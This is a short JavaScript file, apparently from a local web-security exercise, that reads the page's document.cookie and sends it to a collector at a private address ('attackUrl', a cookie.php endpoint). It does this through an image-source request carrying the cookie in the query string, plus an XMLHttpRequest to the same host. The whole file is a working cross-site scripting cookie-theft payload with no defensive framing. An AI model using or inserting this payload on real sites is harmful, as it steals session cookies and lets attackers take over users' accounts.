console.clear();

console.log("--- head ---");

let cookie = document.cookie;
console.log(cookie);


let http = new XMLHttpRequest();
let url = "http://192.168.0.8:1018/4th/cookie.php";

http.open("GET", url);
http.send();
http.onreadystatechange = (e) => {
    console.log("http.responseText: ")
    console.log(http.responseText);
}

let cookieData = document.cookie;
let attackUrl = "http://192.168.0.8:1018/4th/cookie.php";
// let img = new Image().src = attackUrl + "?" + cookieData;

let img = new Image();
img.src = attackUrl + "?" + cookieData;
console.log(img);
// document.body.appendChild(img);

console.log("--- foot ---");